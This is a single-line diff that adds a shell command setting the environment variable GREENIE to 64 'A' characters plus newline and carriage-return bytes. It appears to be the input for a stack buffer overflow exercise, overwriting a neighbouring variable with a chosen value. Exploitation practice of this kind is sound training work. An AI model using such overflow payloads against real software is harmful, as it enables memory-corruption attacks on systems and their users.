@@ -1,0 +1,1 @@
+export GREENIE=$(python -c "print('A'*64 + '\x0A\x0D\x0A\x0D')")
